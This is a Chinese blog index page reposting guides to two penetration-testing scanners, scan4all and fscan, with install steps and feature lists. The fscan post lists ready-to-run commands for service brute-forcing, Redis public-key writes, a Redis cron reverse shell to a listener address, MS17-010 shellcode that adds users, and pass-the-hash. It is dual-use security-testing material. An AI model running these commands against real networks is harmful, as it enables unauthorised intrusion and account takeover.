<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="杨CC">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="杨CC的小世界"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="杨CC的小世界"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>page - 杨CC的小世界</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="杨CC的小世界" type="application/atom+xml">
</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    首页
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    标签
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    分类
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    关于我?
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    归档文章
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">杨CC的小世界</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/scan4all-%E4%B8%80%E6%AC%BE%E6%94%AF%E6%8C%8115000-POC%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/">
                scan4all-一款支持15000+POC的漏洞扫描工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="15000-POC漏洞扫描工具"><a href="#15000-POC漏洞扫描工具" class="headerlink" title="15000+POC漏洞扫描工具"></a>15000+POC漏洞扫描工具</h1><h2 id="POC是什么"><a href="#POC是什么" class="headerlink" title="POC是什么"></a>POC是什么</h2><h3 id="Proof-Of-Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。"><a href="#Proof-Of-Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。" class="headerlink" title="Proof Of Concept的缩写。在黑客圈指：观点验证程序。运行这个程序就可以得出预期的结果，也就验证了观点。"></a>Proof Of Concept的缩写。<em>在黑客圈指：观点验证程序</em>。运行这个程序就可以得出预期的结果，也就验证了观点。</h3><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a target="_blank" rel="noopener" href="https://github.com/GhostTroops/scan4all">https://github.com/GhostTroops/scan4all</a></p>
<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/GhostTroops/scan4all/releases">https://github.com/GhostTroops/scan4all/releases</a></p>
<h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><p><a target="_blank" rel="noopener" href="https://github.com/GhostTroops/scan4all/blob/main/static/Installation.md">https://github.com/GhostTroops/scan4all/blob/main/static/Installation.md</a></p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>sudo apt install -y libpcap-dev golang git<br>git clone <a target="_blank" rel="noopener" href="https://github.com/hktalent/scan4all.git">https://github.com/hktalent/scan4all.git</a><br>cd scan4all<br>go build</p>
<h2 id="1-在运行scan4all之前，你必须先安装libpcap库"><a href="#1-在运行scan4all之前，你必须先安装libpcap库" class="headerlink" title="1.在运行scan4all之前，你必须先安装libpcap库"></a>1.在运行scan4all之前，你必须先安装libpcap库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu、linux</span><br><span class="line">apt update</span><br><span class="line">apt install -yy libpcap0.8-dev</span><br><span class="line">sudo apt install -y libpcap-dev</span><br><span class="line"># cent os</span><br><span class="line">yum install -yy glibc-devel.x86_64</span><br><span class="line">yum install -yy libpcap</span><br><span class="line"># mac os</span><br><span class="line">brew install libpcap</span><br></pre></td></tr></table></figure>



<h2 id="2-前往-https-github-com-hktalent-scan4all-releases-下载scan4all最新版运行"><a href="#2-前往-https-github-com-hktalent-scan4all-releases-下载scan4all最新版运行" class="headerlink" title="2.前往 https://github.com/hktalent/scan4all/releases/ 下载scan4all最新版运行:"></a>2.前往 <a target="_blank" rel="noopener" href="https://github.com/hktalent/scan4all/releases/">https://github.com/hktalent/scan4all/releases/</a> 下载scan4all最新版运行:</h2><h2 id="nmap官网"><a href="#nmap官网" class="headerlink" title="nmap官网"></a>nmap官网</h2><p><a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a></p>
<h2 id="ubuntu-kali–debian系列"><a href="#ubuntu-kali–debian系列" class="headerlink" title="ubuntu\kali–debian系列"></a>ubuntu\kali–debian系列</h2><p>sudo apt-get install nmap</p>
<p>sudo apt-get install golang-go</p>
<h2 id="centos-renhat-红帽系列"><a href="#centos-renhat-红帽系列" class="headerlink" title="centos\renhat-红帽系列"></a>centos\renhat-红帽系列</h2><p>sudo yum install -y nmap</p>
<p>sudo yum install -y  golang &amp;&amp; sudo yum install -y go</p>
<h2 id="manjaro-blackarch–arch系列"><a href="#manjaro-blackarch–arch系列" class="headerlink" title="manjaro&#x2F;blackarch–arch系列"></a>manjaro&#x2F;blackarch–arch系列</h2><p>sudo pacman -S nmap </p>
<p>sudo pacman -S golang-go &amp;&amp; sudo pacman -S golang-dev</p>
<h2 id="aur"><a href="#aur" class="headerlink" title="aur"></a>aur</h2><p>yay -S nmap </p>
<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><p>Vulnerabilities Scan；15000+PoC漏洞扫描；[ 23 ] 种应用弱口令爆破；7000+Web指纹；146种协议90000+规则Port扫描；Fuzz、HW打点、BugBounty神器…</p>
<h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/PJG3jJlPv0zkpk1Xic2TUdUUF1iadG5s3cdbxotp5DgJ7UjqD4ic90eRC8A0zwjeb371OhlmtMsOUV2Dtfl8FzTrA/640?wx_fmt=png&from=appmsg&wxfrom=13" alt="图片"></h1><ul>
<li><p>什么是scan4all：集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写<br>原则上不重复造轮子，除非存在bug、问题</p>
</li>
<li><p>跨平台：基于golang实现，轻量级、高度可定制、开源，支持Linux、windows、mac os等(go tool dist list)46种不同芯片架构、14种操作系统</p>
</li>
<li><p>支持[ 23 ] 种密码爆破，支持自定义字典, 通过 “priorityNmap”: true 开启</p>
</li>
<li><ul>
<li>RDP</li>
<li>VNC</li>
<li>SSH</li>
<li>Socks5</li>
<li>rsh-spx</li>
<li>Mysql</li>
<li>MsSql</li>
<li>Oracle</li>
<li>Postgresql</li>
<li>Redis</li>
<li>FTP</li>
<li>Mongodb</li>
<li>SMB,同时检测 MS17-010（CVE-2017-0143、CVE-2017-0144、CVE-2017-0145、CVE-2017-0146、CVE-2017-0147、CVE-2017-0148）、SmbGhost（CVE-2020-0796）、DCOM(msrpc, port 135, Oxid Scan)</li>
<li>Telnet</li>
<li>Snmp</li>
<li>Wap-wsp（Elasticsearch）</li>
<li>RouterOs</li>
<li>HTTP BasicAuth(HttpBasic,Authorization), contains Webdav、SVN（Apache Subversion） crack</li>
<li>Weblogic，同时通过 enableNuclei&#x3D;true 开启nuclei，支持T3、IIOP等检测</li>
<li>Tomcat</li>
<li>Jboss</li>
<li>Winrm(wsman)</li>
<li>POP3&#x2F;POP3S</li>
</ul>
</li>
<li><p>默认开启http密码智能爆破，需要 HTTP 密码时才会自动启动，无需人工干预</p>
</li>
<li><p>检测系统是否存在 nmap ，存在通过 priorityNmap&#x3D;true 启用 nmap 进行快速扫描，默认开启，优化过的 nmap 参数比 masscan 快 使用 nmap 的弊端：网络不好的是否，因为流量网络包过大可能会导致结果不全 使用 nmap 另外需要将 root 密码设置到环境变量</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PPSSWWDD=yourRootPswd</span><br></pre></td></tr></table></figure>



<p>更多参考：config&#x2F;doNmapScan.sh 默认使用 naabu 完成端口扫描 -stats&#x3D;true 可以查看扫描进度 能否不扫描端口 ？跳过端口扫描，意外做基于端口指纹进行密码爆破的检测将失效，密码破解功能也一并被跳过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noScan=true  ./scan4all -l list.txt  -v</span><br></pre></td></tr></table></figure>



<ul>
<li>支持直接使用 nmap xml结果输入：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scan4all -l nmapScanResults.xml  -v</span><br></pre></td></tr></table></figure>





<ul>
<li><p>快速 15000+ POC 检测功能，PoCs包含：</p>
<h2 id="Nuclei-Templates-Top-10-statistics"><a href="#Nuclei-Templates-Top-10-statistics" class="headerlink" title="Nuclei Templates Top 10 statistics"></a>Nuclei Templates Top 10 statistics</h2></li>
<li><p>nuclei POC</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>TAG</th>
<th>COUNT</th>
<th>AUTHOR</th>
<th>COUNT</th>
<th>DIRECTORY</th>
<th>COUNT</th>
<th>SEVERITY</th>
<th>COUNT</th>
<th>TYPE</th>
<th>COUNT</th>
</tr>
</thead>
<tbody><tr>
<td>cve</td>
<td>1430</td>
<td>daffainfo</td>
<td>631</td>
<td>cves</td>
<td>1407</td>
<td>info</td>
<td>1474</td>
<td>http</td>
<td>3858</td>
</tr>
<tr>
<td>panel</td>
<td>655</td>
<td>dhiyaneshdk</td>
<td>584</td>
<td>exposed-panels</td>
<td>662</td>
<td>high</td>
<td>1009</td>
<td>file</td>
<td>76</td>
</tr>
<tr>
<td>edb</td>
<td>563</td>
<td>pikpikcu</td>
<td>329</td>
<td>vulnerabilities</td>
<td>509</td>
<td>medium</td>
<td>818</td>
<td>network</td>
<td>51</td>
</tr>
<tr>
<td>lfi</td>
<td>509</td>
<td>pdteam</td>
<td>269</td>
<td>technologies</td>
<td>282</td>
<td>critical</td>
<td>478</td>
<td>dns</td>
<td>17</td>
</tr>
<tr>
<td>xss</td>
<td>491</td>
<td>geeknik</td>
<td>187</td>
<td>exposures</td>
<td>275</td>
<td>low</td>
<td>225</td>
<td></td>
<td></td>
</tr>
<tr>
<td>wordpress</td>
<td>419</td>
<td>dwisiswant0</td>
<td>169</td>
<td>misconfiguration</td>
<td>237</td>
<td>unknown</td>
<td>11</td>
<td></td>
<td></td>
</tr>
<tr>
<td>exposure</td>
<td>407</td>
<td>0x_akoko</td>
<td>165</td>
<td>token-spray</td>
<td>230</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>cve2021</td>
<td>352</td>
<td>princechaddha</td>
<td>151</td>
<td>workflows</td>
<td>189</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>rce</td>
<td>337</td>
<td>ritikchaddha</td>
<td>137</td>
<td>default-logins</td>
<td>103</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>wp-plugin</td>
<td>316</td>
<td>pussycat0x</td>
<td>133</td>
<td>file</td>
<td>76</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>281 directories, 3922 files.</p>
<ul>
<li><p>vscan POC</p>
</li>
<li><ul>
<li>vscan POC包含了：xray 2.0 300+ POC、 go POC等；特别注意，xray POC检测需要有指纹命中后才会触发检测</li>
</ul>
</li>
<li><p>scan4all POC</p>
</li>
<li><p>支持 7000+ web 指纹扫描、识别：</p>
</li>
<li><ul>
<li>vscan 指纹：包含 eHoleFinger、 localFinger等</li>
<li>httpx 指纹</li>
<li>vscan 指纹</li>
<li>scan4all 指纹</li>
</ul>
</li>
<li><p>支持146种协议90000+规则port扫描</p>
</li>
<li><ul>
<li>依赖nmap支持的协议、指纹</li>
</ul>
</li>
<li><p>快速HTTP敏感文件检测，可以自定义字典</p>
</li>
<li><p>登陆页面检测</p>
</li>
<li><p>支持多种类型的输入 - STDIN&#x2F;HOST&#x2F;IP&#x2F;CIDR&#x2F;URL&#x2F;TXT</p>
</li>
<li><p>支持多种输出类型 - JSON&#x2F;TXT&#x2F;CSV&#x2F;STDOUT</p>
</li>
<li><p>高度可集成：可配置将结果统一存储到 Elasticsearch【强烈推荐】</p>
</li>
<li><p>智能SSL分析：</p>
</li>
<li><ul>
<li>深入分析，自动关联SSL信息中域名的扫描，如*.xxx.com，并根据配置完成子域遍历，结果自动添加目标到扫描列表</li>
<li>支持开启智能SSL信息中*.xx.com子域遍历功能， export EnableSubfinder&#x3D;true，或者在配置文件中调整</li>
</ul>
</li>
<li><p>自动识别域（DNS）关联多个IP的情况，并自动扫描关联的多个IP</p>
</li>
<li><p>智能处理：</p>
</li>
<li><ul>
<li>1、当列表中多个域名的ip相同时，合并端口扫描，提高效率</li>
<li>2、智能处理http异常页面、及指纹计算和学习</li>
</ul>
</li>
<li><p>自动化供应链识别、分析和扫描</p>
</li>
<li><p>联动 python3 log4j-scan</p>
</li>
<li><ul>
<li>该版本屏蔽你目标信息传递到 DNS Log Server 的bug，避免暴露漏洞</li>
<li>增加了将结果发送到 Elasticsearch 的功能，便于批量、盲打</li>
<li>未来有时间了再实现golang版本 如何使用？</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/MyWork/;cd ~/MyWork/;git clone  https://github.com/hktalent/log4j-scan</span><br></pre></td></tr></table></figure>



<ul>
<li>智能识别蜜罐，并跳过目标，默认该功能是关闭的，可设置EnableHoneyportDetection&#x3D;true开启</li>
<li>高度可定制：允许通过config&#x2F;config.json配置定义自己的字典，或者控制更多细节，包含不限于:nuclei、httpx、naabu等</li>
<li>支持HTTP请求走私漏洞检测: CL-TE、TE-CL、TE-TE、CL_CL、BaseErr</li>
</ul>
<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/PJG3jJlPv0zkpk1Xic2TUdUUF1iadG5s3cjUJMb3rejdart5SUCu6lxWPDPLKeNtLKUficlJJgCvsUpHxaAKSkkNg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ul>
<li>支持 通过参数 Cookie&#x3D;’PHPSession&#x3D;xxxx’ .&#x2F;scan4all -host xxxx.com, 兼容 nuclei、httpx、go-poc、x-ray POC、filefuzz、http Smuggling等</li>
</ul>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/fscan-%E4%B8%80%E6%AC%BE%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E5%9C%A8%E5%86%85%E7%BD%91%E9%81%A8%E6%B8%B8%E7%9A%84%E5%B7%A5%E5%85%B7/">
                fscan-一款可以让你在内网遨游的工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p>github链接:<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
<p>giothub下载链接:<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/releases/tag/1.8.3">https://github.com/shadow1ng/fscan/releases/tag/1.8.3</a></p>
<p>中文版本:<a target="_blank" rel="noopener" href="https://github.com/ChinaRan0/fscan-Chinese">https://github.com/ChinaRan0/fscan-Chinese</a> #404师傅汉化</p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能.</p>
<h2 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2.主要功能"></a>2.主要功能</h2><h4 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集:"></a>1.信息搜集:</h4><ul>
<li>存活探测(icmp)</li>
<li>端口扫描</li>
</ul>
<h4 id="2-爆破功能"><a href="#2-爆破功能" class="headerlink" title="2.爆破功能:"></a>2.爆破功能:</h4><ul>
<li>各类服务爆破(ssh、smb、rdp等)</li>
<li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li>
</ul>
<h4 id="3-系统信息、漏洞扫描"><a href="#3-系统信息、漏洞扫描" class="headerlink" title="3.系统信息、漏洞扫描:"></a>3.系统信息、漏洞扫描:</h4><ul>
<li>netbios探测、域控识别</li>
<li>获取目标网卡信息</li>
<li>高危漏洞扫描(ms17010等)</li>
</ul>
<h4 id="4-Web探测功能"><a href="#4-Web探测功能" class="headerlink" title="4.Web探测功能:"></a>4.Web探测功能:</h4><ul>
<li>webtitle探测</li>
<li>web指纹识别(常见cms、oa框架等)</li>
<li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li>
</ul>
<h4 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用:"></a>5.漏洞利用:</h4><ul>
<li>redis写公钥或写计划任务</li>
<li>ssh命令执行</li>
<li>ms17017利用(植入shellcode),如添加用户等</li>
</ul>
<h4 id="6-其他功能"><a href="#6-其他功能" class="headerlink" title="6.其他功能:"></a>6.其他功能:</h4><ul>
<li>文件保存</li>
</ul>
<h2 id="3-使用说明"><a href="#3-使用说明" class="headerlink" title="3.使用说明"></a>3.使用说明</h2><p>简单用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></table></figure>

<p>其他用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></table></figure>

<p>编译命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w &quot; -trimpath main.go</span><br><span class="line">upx -9 fscan.exe (可选,压缩体积)</span><br></pre></td></tr></table></figure>

<p>arch用户安装 <code>yay -S fscan-git  或者 paru -S fscan-git</code></p>
<p>完整参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">-c string</span><br><span class="line">      ssh命令执行</span><br><span class="line">-cookie string</span><br><span class="line">      设置cookie</span><br><span class="line">-debug int</span><br><span class="line">      多久没响应,就打印当前进度(default 60)</span><br><span class="line">-domain string</span><br><span class="line">      smb爆破模块时,设置域名</span><br><span class="line">-h string</span><br><span class="line">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class="line">-hf string</span><br><span class="line">      读取文件中的目标</span><br><span class="line">-hn string</span><br><span class="line">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class="line">-m string</span><br><span class="line">      设置扫描模式: -m ssh (default &quot;all&quot;)</span><br><span class="line">-no</span><br><span class="line">      扫描结果不保存到文件中</span><br><span class="line">-nobr</span><br><span class="line">      跳过sql、ftp、ssh等的密码爆破</span><br><span class="line">-nopoc</span><br><span class="line">      跳过web poc扫描</span><br><span class="line">-np</span><br><span class="line">      跳过存活探测</span><br><span class="line">-num int</span><br><span class="line">      web poc 发包速率  (default 20)</span><br><span class="line">-o string</span><br><span class="line">      扫描结果保存到哪 (default &quot;result.txt&quot;)</span><br><span class="line">-p string</span><br><span class="line">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)</span><br><span class="line">-pa string</span><br><span class="line">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class="line">-path string</span><br><span class="line">      fcgi、smb romote file path</span><br><span class="line">-ping</span><br><span class="line">      使用ping代替icmp进行存活探测</span><br><span class="line">-pn string</span><br><span class="line">      扫描时要跳过的端口,as: -pn 445</span><br><span class="line">-pocname string</span><br><span class="line">      指定web poc的模糊名字, -pocname weblogic</span><br><span class="line">-proxy string</span><br><span class="line">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class="line">-user string</span><br><span class="line">      指定爆破时的用户名</span><br><span class="line">-userf string</span><br><span class="line">      指定爆破时的用户名文件</span><br><span class="line">-pwd string</span><br><span class="line">      指定爆破时的密码</span><br><span class="line">-pwdf string</span><br><span class="line">      指定爆破时的密码文件</span><br><span class="line">-rf string</span><br><span class="line">      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)</span><br><span class="line">-rs string</span><br><span class="line">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class="line">-silent</span><br><span class="line">      静默扫描,适合cs扫描时不回显</span><br><span class="line">-sshkey string</span><br><span class="line">      ssh连接时,指定ssh私钥</span><br><span class="line">-t int</span><br><span class="line">      扫描线程 (default 600)</span><br><span class="line">-time int</span><br><span class="line">      端口扫描超时时间 (default 3)</span><br><span class="line">-u string</span><br><span class="line">      指定Url扫描</span><br><span class="line">-uf string</span><br><span class="line">      指定Url文件扫描</span><br><span class="line">-wt int</span><br><span class="line">      web访问超时时间 (default 5)</span><br><span class="line">-pocpath string</span><br><span class="line">      指定poc路径</span><br><span class="line">-usera string</span><br><span class="line">      在原有用户字典基础上,新增新用户</span><br><span class="line">-pwda string</span><br><span class="line">      在原有密码字典基础上,增加新密码</span><br><span class="line">-socks5</span><br><span class="line">      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)</span><br><span class="line">-sc </span><br><span class="line">      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)</span><br></pre></td></tr></table></figure>



<h2 id="4-运行截图"><a href="#4-运行截图" class="headerlink" title="4.运行截图"></a>4.运行截图</h2><p><code>fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/1.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/1.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/4.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/4.png" alt="img"></a></p>
<p><code>fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/2.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/2.png" alt="img"></a></p>
<p><code>fscan.exe -h 192.168.x.x -c &quot;whoami;id&quot; (ssh 命令)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/3.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/3.png" alt="img"></a></p>
